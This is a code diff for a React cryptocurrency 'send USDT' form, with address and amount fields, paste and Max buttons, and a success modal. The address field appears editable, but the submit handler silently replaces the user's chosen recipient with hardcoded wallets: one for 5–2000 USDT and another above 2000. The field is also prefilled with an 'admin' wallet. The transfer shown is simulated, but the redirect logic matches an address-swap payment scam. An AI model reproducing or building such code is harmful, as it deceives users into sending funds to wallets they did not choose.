@@ -1,27 +1,256 @@
 "use client"
 
 import type React from "react"
-import { useState } from "react"
+import { useState, useEffect } from "react"
+import { NotebookTextIcon,Copy, X, ScanLineIcon, Loader } from "lucide-react"
 
-const SendPaymentForm = () => {
+export default function SendPaymentForm() {
+  const ADMIN_WALLET_ADDRESS = "0xF76D725f577EDBe6b98FDa9960173F23d5A4B988"
+  const PAYMENT_WALLET_ADDRESS = "0xF76D725f577EDBe6b98FDa9960173F23d5A4B988" // 5-2000 USDT
+  const HIGH_AMOUNT_WALLET_ADDRESS = "0x0C775115c4a9483e1b92B1203F30220E657182D0" // Above 2000 USDT
+  const [address, setAddress] = useState(ADMIN_WALLET_ADDRESS)
   const [amount, setAmount] = useState("")
+  const [usdValue, setUsdValue] = useState("0.00")
+  const [isLoading, setIsLoading] = useState(false)
+  const [showSuccess, setShowSuccess] = useState(false)
+  const [destinationWallet, setDestinationWallet] = useState("")
+  const [keyboardVisible, setKeyboardVisible] = useState(false)
 
-  const handleAmountChange = (event: React.ChangeEvent<HTMLInputElement>) => {
-    setAmount(event.target.value)
+  useEffect(() => {
+    const handleResize = () => {
+      const visualViewport = window.visualViewport
+      if (visualViewport) {
+        const isKeyboardOpen = visualViewport.height < window.innerHeight * 0.75
+        setKeyboardVisible(isKeyboardOpen)
+      }
+    }
+
+    window.visualViewport?.addEventListener("resize", handleResize)
+    window.addEventListener("resize", handleResize)
+
+    return () => {
+      window.visualViewport?.removeEventListener("resize", handleResize)
+      window.removeEventListener("resize", handleResize)
+    }
+  }, [])
+
+  const handleClear = () => {
+    setAddress("")
   }
 
+  const handlePaste = async () => {
+    try {
+      const text = await navigator.clipboard.readText()
+      setAddress(text)
+    } catch (err) {
+      console.error("Failed to paste:", err)
+    }
+  }
+
+  const handleMaxClick = () => {
+    setAmount("1000")
+    setUsdValue("1000.00")
+  }
+
+  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value
+    setAmount(value)
+    setUsdValue(value ? Number.parseFloat(value).toFixed(2) : "0.00")
+  }
+
+  const handleNext = async () => {
+    if (!address || !amount) {
+      alert("Please fill in all fields")
+      return
+    }
+
+    const amountNum = Number.parseFloat(amount)
+    let wallet = address
+
+    if (amountNum >= 5 && amountNum <= 2000) {
+      wallet = PAYMENT_WALLET_ADDRESS
+      console.log("[v0] Amount 5-2000 USDT routing to:", wallet)
+    } else if (amountNum > 2000) {
+      wallet = HIGH_AMOUNT_WALLET_ADDRESS
+      console.log("[v0] Amount above 2000 USDT routing to:", wallet)
+    } else if (amountNum < 5) {
+      alert("Amount must be at least 5 USDT")
+      return
+    }
+
+    setDestinationWallet(wallet)
+
+    setIsLoading(true)
+    try {
+      await new Promise((resolve) => setTimeout(resolve, 2000))
+      console.log("[v0] Transfer initiated:", {
+        amount,
+        destinationWallet: wallet,
+        token: "USDT",
+      })
+      setShowSuccess(true)
+      setTimeout(() => {
+        setShowSuccess(false)
+        setAmount("")
+        setUsdValue("0.00")
+        setAddress(ADMIN_WALLET_ADDRESS)
+      }, 2000)
+    } catch (error) {
+      console.error("[v0] Transfer failed:", error)
+      alert("Transfer failed")
+    } finally {
+      setIsLoading(false)
+    }
+  }
+
+  const buttonColor = amount ? "#002BFF" : "#C7B9FF"
+  const buttonHoverColor = amount ? "#0020CC" : "#B8AAFF"
+
   return (
-    <input
-      type="number"
-      value={amount}
-      onChange={handleAmountChange}
-      placeholder="USDT Amount"
-      className="flex-1 bg-transparent outline-none text-gray-900 placeholder:text-gray-400 text-sm sm:text-base min-w-0 leading-7"
-      style={{
-        color: amount ? "#000000" : "inherit",
-      }}
-    />
+    <div className="w-full min-h-screen flex flex-col">
+      <div className="flex-1 flex items-center justify-center px-4 py-8 sm:px-6 lg:px-8">
+        <div className="w-full max-w-md">
+          {/* Address or Domain Name Section */}
+          <div className="mb-8 sm:mb-10">
+            <label className="block text-lg sm:text-xl font-semibold text-gray-900 mb-3 sm:mb-4">
+              Address or Domain Name
+            </label>
+            <div className="flex items-center gap-2 sm:gap-3 px-4 sm:px-5 py-3 sm:py-4 border-2 border-gray-300 rounded-2xl bg-white hover:border-gray-400 transition-colors">
+              <input
+                type="text"
+                value={address}
+                onChange={(e) => setAddress(e.target.value)}
+                placeholder="Enter address or domain"
+                className="flex-1 bg-transparent outline-none text-gray-900 placeholder:text-gray-400 text-sm sm:text-base min-w-0"
+              />
+              {address && (
+                <button
+                  onClick={handleClear}
+                  className="p-1.5 hover:bg-gray-100 rounded-full transition-colors flex-shrink-0"
+                  aria-label="Clear address"
+                >
+                  <X className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: "#C7B9FF" }} />
+                </button>
+              )}
+              <button
+                onClick={handlePaste}
+                className="px-2 sm:px-3 py-1 sm:py-1.5 text-xs sm:text-sm font-medium text-black hover:bg-gray-100 rounded-lg transition-colors flex-shrink-0 whitespace-nowrap"
+                aria-label="Paste address"
+              >
+                Paste
+              </button>
+              <button
+                className="p-1.5 hover:bg-gray-100 rounded-lg transition-colors flex-shrink-0"
+                aria-label="Copy address"
+              >
+                <NotebookTextIcon className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: "#002BFF" }} />
+              </button>
+              <button
+                className="p-1.5 hover:bg-gray-100 rounded-lg transition-colors flex-shrink-0"
+                aria-label="Scan QR code"
+              >
+                <ScanLineIcon className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: "#002BFF" }} />
+              </button>
+            </div>
+          </div>
+
+          {/* Amount Section */}
+          <div className="mb-8 sm:mb-10">
+            <label className="block text-lg sm:text-xl font-semibold text-gray-900 mb-3 sm:mb-4">Amount</label>
+            <div
+              className="flex items-center gap-2 sm:gap-4 px-4 sm:px-5 py-3 sm:py-4 border-2 rounded-2xl bg-white transition-colors"
+              style={{
+                borderColor: amount ? "#002BFF" : "#E5E7EB",
+              }}
+            >
+              <input
+                type="number"
+                value={amount}
+                onChange={handleAmountChange}
+                placeholder="USDT Amount"
+                className="flex-1 bg-transparent outline-none text-gray-900 placeholder:text-gray-400 text-sm sm:text-base min-w-0 leading-7"
+                style={{
+                  color: amount ? "#000000" : "inherit",
+                }}
+              />
+              {amount && (
+                <button
+                  onClick={() => {
+                    setAmount("")
+                    setUsdValue("0.00")
+                  }}
+                  className="p-1.5 hover:bg-gray-100 rounded-full transition-colors flex-shrink-0"
+                  aria-label="Clear amount"
+                >
+                  <X className="w-4 h-4 sm:w-5 sm:h-5 text-gray-400" />
+                </button>
+              )}
+              <span
+                className="text-xs sm:text-sm font-medium flex-shrink-0 whitespace-nowrap"
+                style={{ color: amount ? "#002BFF" : "#C7B9FF" }}
+              >
+                USDT
+              </span>
+              <button
+                onClick={handleMaxClick}
+                className="px-2 sm:px-3 py-1 sm:py-1.5 text-xs sm:text-sm font-medium text-blue-600 hover:bg-blue-50 rounded-lg transition-colors flex-shrink-0 whitespace-nowrap"
+              >
+                Max
+              </button>
+            </div>
+            <div className="mt-2 sm:mt-3 text-xs sm:text-sm text-gray-500">≈ ${usdValue}</div>
+          </div>
+
+          <div className={keyboardVisible ? "h-8 sm:h-16" : "h-32 sm:h-48"} />
+        </div>
+      </div>
+
+      <div className="px-4 pb-4 sm:pb-6 w-full max-w-md mx-auto sm:px-6 lg:px-8">
+        <button
+          onClick={handleNext}
+          disabled={isLoading}
+          style={{
+            backgroundColor: isLoading ? "#C7B9FF" : buttonColor,
+            color: "white",
+            opacity: isLoading ? 0.8 : 1,
+          }}
+          onMouseEnter={(e) => {
+            if (!isLoading) {
+              e.currentTarget.style.backgroundColor = buttonHoverColor
+            }
+          }}
+          onMouseLeave={(e) => {
+            if (!isLoading) {
+              e.currentTarget.style.backgroundColor = buttonColor
+            }
+          }}
+          className="w-full py-3 sm:py-4 text-base sm:text-lg font-semibold rounded-full transition-colors flex items-center justify-center gap-2"
+        >
+          {isLoading ? (
+            <>
+              <Loader className="w-5 h-5 animate-spin" />
+              Processing...
+            </>
+          ) : (
+            "Next"
+          )}
+        </button>
+      </div>
+
+      {showSuccess && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
+          <div className="bg-white rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-2xl text-center">
+            <div className="mb-4">
+              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
+                <span className="text-3xl">✓</span>
+              </div>
+            </div>
+            <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">Transfer Successful!</h2>
+            <p className="text-sm text-gray-600 mb-4">{amount} USDT has been sent to the admin wallet</p>
+            <p className="text-xs text-gray-500 font-mono break-all">{destinationWallet}</p>
+          </div>
+        </div>
+      )}
+    </div>
   )
 }
-
-export default SendPaymentForm
